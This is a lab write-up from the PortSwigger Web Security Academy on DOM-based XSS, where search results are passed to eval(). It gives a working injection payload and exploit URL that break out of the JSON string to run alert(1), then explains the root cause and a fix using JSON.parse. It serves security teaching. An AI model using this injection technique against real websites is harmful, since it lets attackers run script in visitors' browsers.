# PortSwigger Lab Write-up – DOM XSS using eval()

## 🧪 Lab

**DOM XSS in search functionality using eval()**

Lab No: **12**
Platform: PortSwigger Web Security Academy

---

## 🧠 Vulnerability

**DOM-Based Cross-Site Scripting (XSS)**

The application retrieves search results using an AJAX request and processes the response using the dangerous `eval()` function.

Vulnerable code:

```
eval('var searchResultsObj = ' + this.responseText);
```

Using `eval()` on untrusted data allows attackers to execute arbitrary JavaScript.

---

## 🎯 Goal

Trigger JavaScript execution by manipulating the search parameter.

---

## 🔍 Exploitation

The server returns JSON data like:

```
{
 "results":[],
 "searchTerm":"USER_INPUT"
}
```

Because the response is executed with `eval()`, an attacker can break out of the JSON string and inject JavaScript.

### Payload

```
hello\"-alert(1)}//
```

### Exploit URL

```
/?search=hello\"-alert(1)}//
```

---

## ⚙️ How the Payload Works

Server response becomes:

```
"results":[],"searchTerm":"hello\"-alert(1)}//"
```

When processed by `eval()`:

```
var searchResultsObj = {"results":[],"searchTerm":"hello\"}-alert(1)}//
```

Explanation:

* `\"` escapes the quote
* `}` closes the JSON object
* `-alert(1)` executes JavaScript
* `//` comments the remaining code

---

## 📊 Result

The payload triggers JavaScript execution in the browser.

```
alert(1)
```

This confirms a **DOM-based XSS vulnerability**.

---

## 🛡 Root Cause

* Unsafe usage of `eval()`
* Untrusted server response executed as JavaScript
* Lack of secure JSON parsing

---

## 🔒 Mitigation

Replace `eval()` with safe JSON parsing.

Unsafe code:

```
eval('var searchResultsObj = ' + this.responseText);
```

Secure version:

```
var searchResultsObj = JSON.parse(this.responseText);
```

---

## 🧰 Tools Used

* Burp Suite
* Firefox
* PortSwigger Web Security Academy

---

⚠️ Disclaimer

This write-up is for educational purposes only.
Testing was performed on intentionally vulnerable applications provided by PortSwigger Web Security Academy.
